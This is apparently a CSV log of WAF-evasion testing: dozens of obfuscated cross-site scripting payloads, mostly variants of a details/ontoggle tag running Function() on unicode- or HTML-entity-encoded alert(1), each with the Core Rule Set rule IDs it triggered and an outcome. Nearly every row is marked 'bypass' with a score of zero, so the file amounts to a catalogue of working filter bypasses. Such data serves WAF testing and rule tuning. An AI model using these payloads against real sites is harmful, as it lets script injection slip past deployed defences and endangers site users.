index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
19,<svg onload=Function(atob('YWxlcnQoMSk='))()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628753158.536280
365,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary>click</summary></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781242.961621
366,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary>click</summary></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781338.731475
367,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary>click</summary></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781461.893797
368,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary>click</summary></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781556.094881
369,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary>click</summary></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781525.686636
370,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary>click</summary></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781679.619789
374,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open id=x>",0,1,bypass,2,"941100,941120","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782056.255272
375,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open id=x>,0,1,bypass,2,"941100,941120","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782115.293061
377,"<details open ontoggle=""Function(&quot;&#92;u0061&#92;u006c&#92;u0065&#92;u0072&#92;u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782291.199529
378,"<details ontoggle=""Function(&quot;&#92;u0061&#92;u006c&#92;u0065&#92;u0072&#92;u0074(1)&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782390.259616
380,"<details/open/ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782534.891159
381,"<details open/ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782664.006445
382,"<details/ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""/open>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782692.658833
383,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""/open>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782760.786673
384,"<details	ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""	open>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782841.932396
388,"<details open	ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783115.089261
391,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""open>",0,1,bypass,2,"941100,941120","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783313.337665
392,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""class=x>",0,1,bypass,2,"941100,941120","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783447.310801
393,"<details open class=x ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783592.043061
395,"<details><details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open></details></details>",0,1,bypass,2,"941100,941120","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o17,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762878371.950412
396,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details><summary>test</summary></details></details>",0,1,bypass,2,"941100,941120","v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783845.840126
397,"<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details id=""inner""></details></details>",0,1,bypass,2,"941100,941120","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628783976.373581
398,"<details><details><details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open></details></details></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o26,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628784085.385384
400,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details>",0,1,bypass,2,"941100,941120","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762878416.338517
1001,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary>test</summary></details>,0,1,bypass,2,"941100,941120","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835476.894913
1002,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open id=y>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835513.182781
1003,"<details id=a ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835692.972393
1004,<details id=b ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835776.767357
1005,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details>nested</details></details>",0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835855.797493
1006,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details>test</details></details>,0,1,bypass,2,"941100,941120","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628835986.718742
1007,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><div>content</div></details>",0,1,bypass,2,"941100,941120","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836043.591154
1008,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary>x</summary></details>",0,1,bypass,2,"941100,941120","v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836067.414819
1009,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><p>test</p></details>,0,1,bypass,2,"941100,941120","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836199.707261
1010,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open class=x>",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762883628.509693
1011,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open class=y>,0,1,bypass,2,"941100,941120","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836377.510412
1012,"<details class=a ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836498.577484
1013,<details class=b ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836577.637592
1014,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open>nested</details></details>",0,1,bypass,2,"941100,941120","v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628836674.451989
1020,"<details ontoggle=""Function(&#34;\u0061\u006c\u0065\u0072\u0074(1)&#34;)()"" open>",0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837216.549323
1021,<details ontoggle=Function(&#34;\u0061\u006c\u0065\u0072\u0074(1)&#34;)() open>,0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837235.944395
1022,<details ontoggle=Function(&quot;&#92;u0061\u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837497.313677
1023,<details ontoggle=Function(&quot;\u0061&#92;u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837421.873770
1024,<details ontoggle=Function(&quot;\u0061\u006c&#92;u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837599.961797
1025,<details ontoggle=Function(&quot;\u0061\u006c\u0065&#92;u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837632.149548
1026,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072&#92;u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628837734.761522
1055,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074&#40;1&#41;&quot;)() open>,0,1,bypass,2,"941100,941120","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628840344.342888
1056,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)&#40;&#41;"" open>",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884042.727173
1057,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)&#40;&#41; open>,0,1,bypass,2,"941100,941120","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628840548.378715
1058,"<details ontoggle=""Function&#40;&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&#41;()"" open>",0,1,bypass,2,"941100,941120","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884061.600486
1059,<details ontoggle=Function&#40;&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&#41;() open>,0,1,bypass,2,"941100,941120","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884062.231139
1076,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details>x</details></details>",0,1,bypass,2,"941100,941120","v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842261.127500
1077,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details>y</details></details>,0,1,bypass,2,"941100,941120","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842311.329205
1078,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details><summary>z</summary></details></details>",0,1,bypass,2,"941100,941120","v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842453.149767
1079,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details><summary>a</summary></details></details>,0,1,bypass,2,"941100,941120","v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842539.145610
1080,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open><summary>b</summary></details></details>",0,1,bypass,2,"941100,941120","v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842667.193821
1081,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open><summary>c</summary></details></details>,0,1,bypass,2,"941100,941120","v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842716.526501
1082,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><div><details>d</details></div></details>",0,1,bypass,2,"941100,941120","v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842749.791661
1083,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><div><details>e</details></div></details>,0,1,bypass,2,"941100,941120","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842897.001088
1084,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><span><details>f</details></span></details>",0,1,bypass,2,"941100,941120","v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628842936.269665
1085,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><span><details>g</details></span></details>,0,1,bypass,2,"941100,941120","v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843033.151531
1086,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><p><details>h</details></p></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843177.665243
1087,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><p><details>i</details></p></details>,0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843247.621252
1088,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open id=x><details>j</details></details>",0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884339.417813
1089,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open id=y><details>k</details></details>,0,1,bypass,2,"941100,941120","v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628843493.504541
